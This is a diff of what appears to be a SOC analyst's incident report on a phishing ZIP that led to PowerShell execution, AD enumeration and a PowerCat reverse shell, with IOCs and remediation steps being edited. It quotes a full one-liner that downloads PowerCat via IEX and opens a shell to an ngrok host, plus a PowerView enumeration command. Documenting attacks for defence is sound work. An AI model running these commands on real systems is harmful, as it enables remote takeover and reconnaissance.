@@ -83,81 +83,9 @@ And then establishes and opens a reverse shell or Command & Control (c2) back to
 
 C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell
 
-PowerCat reverse shell:
-
-powercat -c 2.tcp.ngrok.io -p 19282 -e powershell
-
-🖼️ 📷 Insert Kill Chain Screenshot Here
-📌 3. Timeline of Events
-Time	Event	Description
-T0	Email Received	Suspicious .xyz TLD sender
-T1	User Opens Attachment	Important-Invoice-February.zip executed
-T2	PowerShell Execution	ExecutionPolicy Bypass triggered
-T3	LDAP/AD Recon	DNSHostName, LDAP queries, reflection checks
-T4	PowerCat C2	Reverse shell connection attempted
-T5	DNS Activity	DNS queries show enumeration
-🖼️ 📷 Insert Timeline Screenshot Here
-📌 4. Detailed Findings & Evidence
-4.1 Phishing Email Delivery
-
-Sender domain had unusual TLD (.xyz)
-
-Contained malicious ZIP attachment
-
-Likely initial compromise vector
-
-📷 Insert Phishing Email Screenshot
-
-4.2 Malicious PowerShell Execution
-
-The attacker executed PowerShell with a bypass and fileless script execution:
-
-C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell
-
-
-This shows:
-
 Script downloaded from GitHub (PowerCat)
 
 Fileless execution via IEX
-
-Reverse shell created for remote control
-
-📷 Insert PowerShell Execution Screenshot
-
-4.3 Active Directory & LDAP Enumeration
-
-Attackers ran commands similar to PowerView:
-
-Get-DomainComputer -Properties DNSHostName
-
-LDAP queries across domain
-
-AD object enumeration
-
-Reflection‑based security checks
-
-Purpose: map internal environment & identify targets.
-
-📷 Insert AD Enumerati<img width="1920" height="1008" alt="powerview to enumerate DNSHostnames computerobjects LDAP put in file exfiltrateion " src="https://github.com/user-attachments/assets/34119feb-f709-484f-9156-850864faaa88" />
-on Screenshot
-
-4.4 Script Block Logging Evidence
-
-Script Block Text captured exact commands executed:
-
-DNSHostName queries
-
-Recon scripts
-
-PowerView function calls
-
-Script Block Text = full transcript of attacker commands
-
-📷 Insert ScriptBlock Screenshot
-
-4.5 Reverse Shell (C2) Established
-<img width="1274" height="644" alt="powercat downloaded from github" src="https://github.com/user-attachments/assets/6e4313e6-6884-4517-8237-03cee4fa3683" />
 
 
 
@@ -176,14 +104,14 @@ Exfiltration	DNS-based mechanisms	T1048.003
 
  Indicators of Compromise (IOCs)
 Domains:
-- suspicious.xyz
+- john@hatmakereurope.xyz
 - 2.tcp.ngrok.io
 
 
 
 Files:
-- Important-Invoice-February.zip
-- powercat.ps1
+- ImportantInvoice-February.zip
+- powercat
 - powerview.ps1
 
 
@@ -207,49 +135,11 @@ Network:
 ✔ Potential for privilege escalation + lateral movement
 
 
-
- <h2> Containment & Remediation Actions through EDR
-
-   <h1></h1>
-   Immediate Containment
-
-Isolate host from network
-
-Terminate PowerShell sessions
-
-Kill PowerCat reverse shell processes
-
-Block outbound connections to attacker IPs
-
-Disable compromised account
-
-Remediation
-
-Rotate credentials for affected users
-
-Enable strict PowerShell logging
-
-Block PowerCat signatures in EDR
-
-Deploy DNS filtering policies
-
-Harden mail filtering for uncommon TLDs
-
-Detection Engineering
-
-Alert on ExecutionPolicy bypass
-
-Alert on IEX + WebClient script downloads
-
-Alert on AD/LDAP bulk queries
-
-Alert on outbound DNS to rare TLDs
-
-<h2> My Response as a SOC Analyst 
-
 <h1></h1>
 
-As the SOC analyst leading this investigation, I:
+As the SOC analyst leading this investigation
+
+
 
 1. Correlated multi‑source telemetry
 
@@ -257,7 +147,7 @@ Analyzed PowerShell logs, DNS logs, Sysmon, and Splunk ingestion to reconstruct 
 
 2. Identified root cause
 
-Phishing email attachment (Important-Invoice-February.zip) triggered initial compromise.
+Phishing email attachment (ImportantInvoice-February.zip) triggered initial compromise.
 
 3. Verified execution method
 
